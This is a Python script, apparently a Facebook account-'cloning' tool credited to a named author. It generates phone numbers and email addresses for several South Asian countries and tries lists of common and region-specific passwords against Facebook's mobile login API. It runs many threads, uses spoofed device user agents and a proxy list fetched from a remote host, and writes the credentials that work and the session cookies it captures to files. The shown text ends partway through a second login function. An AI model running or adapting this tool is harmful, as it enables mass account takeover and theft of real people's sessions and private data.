fbks=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana')

try:
	import os,requests,json,time,re,random,sys,uuid,string,subprocess,zlib,urllib
	from string import *
	import bs4
	#import dz
	from concurrent.futures import ThreadPoolExecutor as tred
	from bs4 import BeautifulSoup as sop
	from bs4 import BeautifulSoup
except ModuleNotFoundError: 
	print('\n Installing missing modules ...')
	os.system('pip install requests bs4 futures==2 > /dev/null')
	
	

try:
	prox= requests.get('https://raw.githubusercontent.com/4bHii-057/Headoffice/main/proxies.txt').text
	open('proxies.txt','w').write(proxies)
except Exception as e:
	print('\x1b[1;95m[√] LOADING...')
	
proxies=open('proxies.txt','r').read().splitlines()


android_models=[]
try:
	xx = requests.get('https://raw.githubusercontent.com/4bHii-057/Headoffice/main/strings.txt').text.splitlines()
	for line in xx:
		android_models.append(line)
except:pass

usr=[]
try:
	xd=requests.get('https://raw.githubusercontent.com/4bHii-057/Headoffice/main/xxx.txt').text.splitlines()
	for us in xd:
		usr.append(us)
except: pass
##############################################
def abhijhirwal1():
    android_version = str(random.randint(1, 11))  # Android version between 1 and 11
    model = random.choice([
        "Samsung Galaxy S22", "Google Pixel 6", "OnePlus 9", "Huawei P40 Pro", "Xiaomi Redmi 10",
        "Oppo Reno 6", "Vivo V23", "Lenovo K13", "Motorola Moto G9", "Nokia 5.4",
        "LG G8X", "Sony Xperia 1 III", "HTC U20 5G", "Asus ZenFone 8", "ZTE Axon 20",
        "Samsung Galaxy S21", "OnePlus 9 Pro", "Huawei P30 Pro", "Xiaomi Redmi 9", 
        "Oppo Reno 5", "Vivo V21", "Lenovo K12", "Motorola Moto G", "Nokia 5.5",
        "Google Pixel 6 Pro", "Samsung Galaxy S21 Ultra", "OnePlus 9T", "Huawei P40",
        "Xiaomi Redmi 10 Pro", "Oppo Reno 6 Pro", "Vivo V23 Pro", "Lenovo K13 Pro",
        "Motorola Moto G9 Plus", "Nokia 5.5 Pro", "LG G8X Dual Screen", "Sony Xperia 1 III Pro",
        "HTC U20 5G Pro", "Asus ZenFone 8 Pro", "Realme GT", "Poco X3 Pro", "Honor 30 Pro"
    ])  # Random device model
    build = "SDK" + str(random.randint(1, 30))  # Random build number
    fban = "FBAN" + str(random.randint(1, 100))  # Random Facebook app number
    fbav = "FBAV" + str(random.randint(1, 100))  # Random Facebook app version
    fbbv = "FBBV" + str(random.randint(1, 100))  # Random Facebook browser version
    density = str(random.randint(1, 5))  # Random screen density
    width = str(random.randint(300, 1440))  # Random screen width
    height = str(random.randint(500, 2960))  # Random screen height
    fblc = random.choice([
        "en_US", "fr_FR", "es_ES", "de_DE", "it_IT",
        "pt_BR", "zh_CN", "ja_JP", "ko_KR", "ar_AR"
    ])  # Random language code
    fbcr = random.choice(["Android", "Android Tablet"])  # Random Facebook client
    fbmf = random.choice(["mobile", "tablet"])  # Random Facebook mobile or tablet
    fbbd = random.choice([
        "Nexus 5", "Samsung Galaxy S22", "OnePlus 9 Pro",
        "Huawei P30 Pro", "Xiaomi Redmi 9", "Oppo Reno 5",
        "Vivo V21", "Lenovo K12", "Motorola Moto G", "Nokia 5.4",
        "Google Pixel 6 Pro", "Samsung Galaxy S21 Ultra", "OnePlus 9T", "Huawei P40",
        "Xiaomi Redmi 10 Pro", "Oppo Reno 6 Pro", "Vivo V23 Pro", "Lenovo K13 Pro",
        "Motorola Moto G9 Plus", "Nokia 5.5 Pro", "LG G8X Dual Screen", "Sony Xperia 1 III Pro",
        "HTC U20 5G Pro", "Asus ZenFone 8 Pro", "Realme GT", "Poco X3 Pro", "Honor 30 Pro"
    ])  # Random Facebook build device
    fbpn = random.choice([
        "com.facebook.katana", "com.facebook.wakana",
        "com.facebook.orca", "com.facebook.lite"
    ])  # Random Facebook package name
    fbdv = random.choice(["Android", "Android Tablet"])  # Random Facebook device
    fbsv = "FBSV" + str(random.randint(1, 100))  # Random Facebook service version
    fbca = random.choice([
        "armeabi-v7a", "arm64-v8a", "x86", "x86_64",
        "mips", "mips64", "armv7l", "aarch64"
    ])  # Random Facebook CPU architecture

    # Constructing the user agent string
    ua = f"Davik/2.1.0 (Linux; U; Android {android_version}.0.0; {model} Build/{build}) [FBAN/{fban};FBAV/{fbav};FBBV/{fbbv};FBDM={{density={density},width={width},height={height}}};FBLC/{fblc};FBRV/{random.randint(000000000,999999999)};FBCR/{fbcr};FBMF/{fbmf};FBBD/{fbbd};FBPN/{fbpn};FBDV/{fbdv};FBSV/{fbsv};FBCA/{fbca};]"
    return ua
###################################
# List of GT- models
gt = ['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550','GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210 XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750']
#################################################################################################################################
import subprocess

# Define a function to execute shell commands and handle errors
def execute_shell_command(command):
    try:
        output = subprocess.check_output(command, shell=True).decode('utf-8').strip()
        return output
    except subprocess.CalledProcessError as e:
        print(f"Error executing command: {e}")
        return None

# Retrieve device information
sim_id = ''
android_version = execute_shell_command('getprop ro.build.version.release')
model = execute_shell_command('getprop ro.product.model')
build = execute_shell_command('getprop ro.build.id')
fblc = 'en_IN'
fbcr = execute_shell_command('getprop gsm.operator.alpha')
if fbcr is None:
    fbcr = 'Jio'
fbmf = execute_shell_command('getprop ro.product.manufacturer')
fbbd = execute_shell_command('getprop ro.product.brand')
fbdv = model
fbsv = android_version
fbca = execute_shell_command('getprop ro.product.cpu.abilist').replace(',', ':')
fbdm = '{density=2.25,height=' + execute_shell_command('getprop ro.hwui.text_large_cache_height') + ',width=' + execute_shell_command('getprop ro.hwui.text_large_cache_width') + '}'

# Construct the device dictionary
device = {
    'sim_id': sim_id,
    'android_version': android_version,
    'model': model,
    'build': build,
    'fblc': fblc,
    'fbcr': fbcr,
    'fbmf': fbmf,
    'fbbd': fbbd,
    'fbdv': fbdv,
    'fbsv': fbsv,
    'fbca': fbca,
    'fbdm': fbdm
}
#################################################################################################################################
logo=("""\033[1;37m
 .d8b.  d8888b. db   db d888888b 
d8' `8b 88  `8D 88   88   `88'   
88ooo88 88oooY' 88ooo88    88    
88~~~88 88~~~b. 88~~~88    88    
88   88 88   8D 88   88   .88.   
YP   YP Y8888P' YP   YP Y888888P 
###############################################
 TooL Owner: ABHI Jhirwal
 Github    : 4bHii-057
 Facebook  : ABHI Jhirwal
 Version   : File/Random/0.7/Free \033[1;32m(✓)
\033[1;37m###############################################""")
def linex():
        print('\033[1;37m###############################################')
def clear():
        os.system('clear')
        print(logo)
loop=0
oks=[]
cps=[]
twf=[]
pcp=[]
id=[]
tokenku=[]
def menu():
                        clear()
                        print(' \033[1;30m[1] \033[1;32mFile Clone\n \033[1;30m[2] \033[1;32mNumber cloning\n \033[1;30m[3] \033[1;32mGamil Cloning\n \033[1;30m[0] \033[1;32mExit System')
                        linex()
                        xd=input(' Choose an option: ')
                        if xd in ['1','01']:
                                clear()
                                print(' Put file example:  /sdcard/Abhi.txt  etc..')
                                linex()
                                file = input(' Put file path\033[1;37m: ')
                                try:
                                        fo = open(file,'r').read().splitlines()
                                except FileNotFoundError:
                                        print(' File location not found ')
                                        time.sleep(1)
                                        menu()
                                clear()
                                print(' All method working try 1 by 1 ')
                                linex()
                                print(' [1] Method {New Idz} \n [2] Method  {Mix Idz}\n ')
                                linex()
                                mthd=input(' Choose: ')
                                linex()
                                plist = []
                                try:
                                        ps_limit = int(input(' How many passwords ? '))
                                except:
                                        ps_limit =1
                                linex()
                                print('\033[1;32m exp: first last,firtslast,first123')
                                linex()
                                for i in range(ps_limit):
                                        plist.append(input(f' Put password {i+1}: '))
                                linex()
                                print(' Do you went show cp account? (y/n): ')
                                linex()
                                cx=input(' Choose: ')
                                if cx in ['y','Y','yes','Yes','1']:
                                        pcp.append('y')
                                else:
                                        pcp.append('n')
                                with tred(max_workers=30) as crack_submit:
                                        clear()
                                        total_ids = str(len(fo))
                                        print(' Total account : \033[1;32m'+total_ids+f'  \033[1;91mMethod ✓ \033[1;91mM{mthd}')
                                        print("\033[1;37m \033[1;34mUse flight mode for speed up\033[1;37m")
                                        linex()
                                        for user in fo:
                                                ids,names = user.split('|')
                                                passlist = plist
                                                if mthd in ['1','01']:
                                                        crack_submit.submit(api,ids,names,passlist)
                                                elif mthd in ['2','02']:
                                                        crack_submit.submit(api1,ids,names,passlist)                                                
                                print('\033[1;37m')
                                linex()
                                print(' The process has completed')
                                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                                linex()
                                input(' Press enter to back ')
                                os.system('python ABHI.py')                        
                        elif xd in ['2','02']:
                                randm()                               
                        elif xd in ['3','03']:
                                gmail()                                                
                        elif xd in ['0','00']:
                                exit(' Thanks for use 🥰 ')
                        else:
                                exit(' Option not found in menu...')               
def randm():
    clear()
    print(f'\033[1;30m[1]\033[1;32m BANGLADESH CLONING ')
    print(f'\033[1;30m[2]\033[1;32m INDIA CLONING ')
    print(f'\033[1;30m[3]\033[1;32m NEPAL CLONING ')
    print(f'\033[1;30m[4]\033[1;32m PAKISTAN CLONING ')
    print(f'\033[1;30m[5]\033[1;32m AFGHANISTAN CLONING ')    
    print(f'\033[1;30m[0]\033[1;32m BACK TO MENU ');linex()
    option=input(f'\033[1;32m[\033[1;30m?\033[1;32m]\033[1;32mCHOICE : ')
    if option in ['1','01']:
        bd()
    elif option in ['2','02']:
    	india()
    elif option in ['3','03']:
    	nepal()
    elif option in ['4','04']:
    	pakistan()
    elif option in ['5','05']:
    	afghanistan()
    elif option in ['0','00']:
    	menu()
    else:
        exit(f'\033[1;32m[\033[1;31m✓\033[1;32m] BYE BYE ')
#__________________| BANGLADESH |__________________#
def bd():
                user=[]
                clear()
                print('\033[1;31m Code example: 016,017,018,019')
                code = input('\033[1;37m put code: ')
                try:
                        limit = int(input('\033[1;31m example: 2000, 3000, 5000, 10000\n\033[1;37m put limit: '))
                except ValueError:
                        limit = 5000
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(8))
                        user.append(nmp)
                with tred(max_workers=30) as ABHI:     
                        clear()
                        tl = str(len(user))
                        print(' Total account : \033[1;32m'+tl)
                        print(f'\033[1;37m Choice code :\033[1;32m '+code)
                        print(f'\033[1;37m \033[1;34mUse flight mode for speed up\033[1;97m')
                        linex()
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'Bangladesh','bangladesh','i love you','iloveyou','free fire','freefire']
                                ABHI.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                linex()
                input(' Press enter to back ')
                os.system('python ABHI.py')
#__________________| INDIA |__________________#
def india():
                user=[]
                clear()
                print('\033[1;31m EXAMPLE: +91639 | +91934 | +91902 | +91937')
                code = input('\033[1;37m put code: ')
                try:
                        limit = int(input('\033[1;31m example: 2000, 3000, 5000, 10000\n\033[1;37m put limit: '))
                except ValueError:
                        limit = 5000
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(8))
                        user.append(nmp)
                with tred(max_workers=30) as ABHI:     
                        clear()
                        tl = str(len(user))
                        print(' Total account : \033[1;32m'+tl)
                        print(f'\033[1;37m Choice code :\033[1;32m '+code)
                        print(f'\033[1;37m \033[1;34mUse flight mode for speed up\033[1;97m')
                        linex()
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'57273200','59039200','57575751']
                                ABHI.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                linex()
                input(' Press enter to back ')
                os.system('python ABHI.py')
#__________________| NEPAL |__________________#
def nepal():
                user=[]
                clear()
                print('\033[1;31m EXAMPLE: 9815 | 9814 | 9861 | 9840')
                code = input('\033[1;37m put code: ')
                try:
                        limit = int(input('\033[1;31m example: 2000, 3000, 5000, 10000\n\033[1;37m put limit: '))
                except ValueError:
                        limit = 5000
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(8))
                        user.append(nmp)
                with tred(max_workers=30) as ABHI:     
                        clear()
                        tl = str(len(user))
                        print(' Total account : \033[1;32m'+tl)
                        print(f'\033[1;37m Choice code :\033[1;32m '+code)
                        print(f'\033[1;37m \033[1;34mUse flight mode for speed up\033[1;97m')
                        linex()
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'nepal123','kathmandu','tamang','maya','magar','magar123','pokhara','pokhara123','tamang123','maya123']
                                ABHI.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                linex()
                input(' Press enter to back ')
                os.system('python ABHI.py')
		
#__________________| PAKISTAN |__________________#
def pakistan():
                user=[]
                clear()
                print('\033[1;31m EXAMPLE: 0306 | 0335 | 0315 | 0345')
                code = input('\033[1;37m put code: ')
                try:
                        limit = int(input('\033[1;31m example: 2000, 3000, 5000, 10000\n\033[1;37m put limit: '))
                except ValueError:
                        limit = 5000
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(8))
                        user.append(nmp)
                with tred(max_workers=30) as ABHI:     
                        clear()
                        tl = str(len(user))
                        print(' Total account : \033[1;32m'+tl)
                        print(f'\033[1;37m Choice code :\033[1;32m '+code)
                        print(f'\033[1;37m \033[1;34mUse flight mode for speed up\033[1;97m')
                        linex()
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'khankhan','khan1122','ali12345','khanbaba','pakistan','khan12345','ali1122','khankhan12345','khan','baloch','pubg','pubg1122']
                                ABHI.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                linex()
                input(' Press enter to back ')
                os.system('python ABHI.py')
#__________________| AFGHANISTAN |__________________#
def afghanistan():
                user=[]
                clear()
                print('\033[1;31m EXAMPLE: +9340 | +9360 | +9330 | +9350')
                code = input('\033[1;37m put code: ')
                try:
                        limit = int(input('\033[1;31m example: 2000, 3000, 5000, 10000\n\033[1;37m put limit: '))
                except ValueError:
                        limit = 5000
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(8))
                        user.append(nmp)
                with tred(max_workers=30) as ABHI:     
                        clear()
                        tl = str(len(user))
                        print(' Total account : \033[1;32m'+tl)
                        print(f'\033[1;37m Choice code :\033[1;32m '+code)
                        print(f'\033[1;37m \033[1;34mUse flight mode for speed up\033[1;97m')
                        linex()
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'afghan','afghan12345','afghan123','600700','afghanistan','afghan1122','500500','100200','10002000','900900','kabul123','Û±Û³Û³Û³ÛµÛ¶Û·Û¸Û¹','Û±Û³Û³Û³ÛµÛ¶','afghan1234','kabul1234','khankhan','khan123','khan123456','khan786']
                                ABHI.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                linex()
                input(' Press enter to back ')
                os.system('python ABHI.py')
def gmail():
                os.system('rm -rf .re.txt')
                clear()
                print('\033[1;37m example: karan, raj, deepak, sameer\033[1;97m')
                linex()
                first = input(' Put first name: ')
                linex()
                print('\033[1;37m example: kumar, sahil, khan \033[1;97m')
                linex()
                last = input(' Put last name: ')
                linex()
                print(' Example: @gmail.com , @yahoo.com etc...')
                linex()
                domain = input(' domain: ')
                linex()
                try:
                        limit=int(input(' Put limit: '))
                except ValueError:
                        limit = 5000
                linex()
                print(' Getting gmails...')
                lists = ['3','4']
                for xd in range(limit):
                        lchoice = random.choice(lists)
                        if '3' in lchoice:
                                mail = ''.join(random.choice(string.digits) for _ in range(3))
                                open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
                        else:
                                mail = ''.join(random.choice(string.digits) for _ in range(4))
                                open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
                        fo = open('.re.txt', 'r').read().splitlines()
                with tred(max_workers=30) as ABHI:
                        total = str(len(fo))
                        clear()
                        print(' Total account : \033[1;32m'+total)
                        print("\033[1;37m \033[1;34mUse flight mode for speed up\033[1;37m")
                        linex()
                        for user in fo:
                                ids,names = user.split('|')
                                first_name = names.rsplit(' ')[0]
                                try:
                                        last_name = names.rsplit(' ')[1]
                                except IndexError:
                                        last_name = 'Khan'
                                fs = first_name.lower()
                                ls = last_name.lower()
                                passlist = [fs+ls,fs+' '+ls,fs+'123',fs+'12345',fs+'1122',fs,fs+'1234',fs+'786',fs+'12']
                                ABHI.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                linex()
                input(' Press enter to back ')
                os.system('python ABHI.py')
def api(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [ABHI-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'                        
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(digits) for _ in range(2))
                        jazoest = li2+j1
                        data = {
                        "adid": str(uuid.uuid4()),
                        "format": "json",
                        "device_id": str(uuid.uuid4()),
                        "cpl": "true",
                        "family_device_id": str(uuid.uuid4()),
                        "credentials_type": "device_based_login_password",
                        "error_detail_type": "button_with_disabled",
                        "source": "device_based_login",
                        "email": ids,
                        "password": pas,
                        "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
                        "generate_session_cookies": "1",
                        "meta_inf_fbmeta": "",
                        "advertiser_id": str(uuid.uuid4()),
                        "currently_logged_in_userid": "0",
                        "locale": "en_GB",
                        "client_country_code": "GB",
                        "method": "auth.login",
                        "fb_api_req_friendly_name": "authenticate",
                        "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                        "api_key": "882a8490361da98702bf97a021ddc14d"}
                        head = {
                        'User-Agent': abhijhirwal1(),
                        'Content-Type': 'application/x-www-form-urlencoded',
                        'Host': 'graph.facebook.com',
                        'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                        'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                        'X-FB-Connection-Type': 'MOBILE.LTE',
                        'X-Tigon-Is-Retry': 'False',
                        'X-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                        'X-fb-device-group': '5120',
                        'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                        'X-FB-Request-Analytics-Tags': 'graphservice',
                        'X-FB-HTTP-Engine': 'Liger',
                        'X-FB-Client-IP': 'True',
                        'X-FB-Server-Cluster': 'True',
                        'X-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                        url1= 'https://b-graph.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url=url1,data=data,headers=head).json()
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [ABHI-OK] '+ids+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print("\r\r\033[1;33m Cookie: "+coki)
                                        open('/sdcard/ABHI-COKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/ABHI-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[ABHI-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\033[1;91m [ABHI-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/ABHI-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
                                                open('/sdcard/ABHI-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                        else:
                                        continue
                loop+=1
        except requests.exceptions.ConnectionError:
                        time.sleep(10)
        except Exception as e:
                        pass
def api1(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [ABHI-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'                       
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(digits) for _ in range(2))
                        jazoest = li2+j1
                        data = {
                        "adid": str(uuid.uuid4()),
                        "format": "json",
                        "device_id": str(uuid.uuid4()),
                        "cpl": "true",
                        "family_device_id": str(uuid.uuid4()),
                        "credentials_type": "device_based_login_password",
                        "error_detail_type": "button_with_disabled",
                        "source": "device_based_login",
                        "email": ids,
                        "password": pas,
                        "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
                        "generate_session_cookies": "1",
                        "meta_inf_fbmeta": "",
                        "advertiser_id": str(uuid.uuid4()),
                        "currently_logged_in_userid": "0",
                        "locale": "en_GB",
                        "client_country_code": "GB",
                        "method": "auth.login",
                        "fb_api_req_friendly_name": "authenticate",
                        "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                        "api_key": "882a8490361da98702bf97a021ddc14d"}
                        head = {
                        'User-Agent': abhijhirwal1(),
                        'Content-Type': 'application/x-www-form-urlencoded',
                        'Host': 'graph.facebook.com',
                        'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                        'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                        'X-FB-Connection-Type': 'MOBILE.LTE',
                        'X-Tigon-Is-Retry': 'False',
